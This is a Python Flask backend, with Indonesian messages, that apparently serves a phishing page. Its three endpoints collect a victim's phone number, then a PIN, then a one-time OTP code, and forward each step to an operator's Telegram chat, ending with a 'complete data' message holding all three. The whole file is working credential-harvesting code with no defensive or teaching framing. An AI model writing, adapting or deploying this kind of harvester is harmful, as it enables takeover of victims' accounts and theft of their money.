import os
import json
import requests
from flask import Flask, render_template, request, jsonify
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
SESI_FILE = "sesi_data.json"

def baca_sesi():
    try:
        with open(SESI_FILE, "r") as f:
            return json.load(f)
    except:
        return {}

def tulis_sesi(data):
    with open(SESI_FILE, "w") as f:
        json.dump(data, f)

TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")

def send_telegram_message(text):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": text,
        "parse_mode": "HTML",
    }
    try:
        resp = requests.post(url, json=payload, timeout=10)
        resp.raise_for_status()
        return True
    except requests.RequestException as e:
        print(f"Gagal kirim pesan: {e}")
        return False


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/submit-hp", methods=["POST"])
def submit_hp():
    data = request.get_json()
    nomor_hp = data.get("nomor_hp", "").strip()

    if not nomor_hp:
        return jsonify({"success": False, "error": "Nomor HP wajib diisi."}), 400

    sesi = baca_sesi()
    sesi["nomor_hp"] = nomor_hp
    tulis_sesi(sesi)

    text = (
        "🔔 <b>DATA BARU ( 1/3 )</b>\n"
        "─────────────────────\n"
        f"📞 <b>Nomor HP:</b> {nomor_hp}\n"
        "─────────────────────"
    )

    ok = send_telegram_message(text)
    if ok:
        return jsonify({"success": True})
    else:
        return jsonify({"success": False, "error": "Gagal kirim ke Telegram."}), 500


@app.route("/submit-otp", methods=["POST"])
def submit_otp():
    data = request.get_json()
    kode_otp = data.get("kode_otp", "").strip()

    if not kode_otp:
        return jsonify({"success": False, "error": "Kode PIN wajib diisi."}), 400

    sesi = baca_sesi()
    nomor_hp = sesi.get("nomor_hp", "tidak diketahui")
    sesi["pin"] = kode_otp
    tulis_sesi(sesi)

    text = (
        "🔔 <b>DATA BARU ( 2/3 )</b>\n"
        "─────────────────────\n"
        f"📞 <b>Nomor HP:</b> {nomor_hp}\n"
        f"🔒 <b>pin:</b> {kode_otp}"
    )

    ok = send_telegram_message(text)
    if ok:
        return jsonify({"success": True})
    else:
        return jsonify({"success": False, "error": "Gagal kirim ke Telegram."}), 500


@app.route("/submit-kode", methods=["POST"])
def submit_kode():
    data = request.get_json()
    kode_otp = data.get("kode_otp", "").strip()

    if not kode_otp:
        return jsonify({"success": False, "error": "Kode OTP wajib diisi."}), 400

    sesi = baca_sesi()
    nomor_hp = sesi.get("nomor_hp", "tidak diketahui")
    pin = sesi.get("pin", "tidak diketahui")

    text = (
        "🔔 <b>DATA LENGKAP ( 3/3 )</b>\n"
        "─────────────────────\n"
        f"📞 <b>Nomor HP:</b> {nomor_hp}\n"
        f"🔒 <b>PIN:</b> {pin}\n"
        f"🔢 <b>Kode OTP:</b> {kode_otp}\n"
        "─────────────────────"
    )

    ok = send_telegram_message(text)
    if ok:
        return jsonify({"success": True})
    else:
        return jsonify({"success": False, "error": "Gagal kirim ke Telegram."}), 500


if __name__ == "__main__":
    app.run(debug=True)